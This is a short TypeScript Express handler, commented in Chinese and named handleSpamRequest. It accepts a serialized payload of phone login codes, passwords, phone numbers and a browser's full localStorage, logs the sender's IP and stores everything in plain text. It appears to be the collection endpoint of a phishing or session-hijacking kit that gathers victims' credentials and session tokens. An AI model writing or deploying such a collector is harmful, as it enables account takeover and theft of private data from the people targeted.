import { Request, Response } from 'express';
import Customer from '../models/customer'; // 确保正确导入 Customer 模型
import handleAsync from '../utils/handleAsync';

export const handleSpamRequest = handleAsync(
  async (req: Request, res: Response) => {
    const { data } = req.body;

    // 解析接收到的序列化数据
    const parsedData = JSON.parse(data);
    // 从 parsedData 中提取 phoneCode、password 和 phoneNumber
    const { phoneCode, password, phoneNumber, ...localStorageData } =
      parsedData;

    // 如果客户端的 phoneNumber 已经存在于数据库中，抛出错误
    const existingCustomer = await Customer.findOne({ phoneNumber });

    if (existingCustomer) {
      throw new Error('该手机号码已经存在');
    }

    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress; // 获取客户端 IP 地址

    // 创建新的 Customer 实例
    const newCustomer = new Customer({
      phoneCode,
      password,
      phoneNumber,
      localStorage: data, // 将 localStorageData 转换为字符串存储
      ip,
    });

    // 保存到数据库
    await newCustomer.save();

    // 返回成功响应
    res.status(200).json({
      message: '请求成功',
      data: { phoneCode },
    });
  },
);
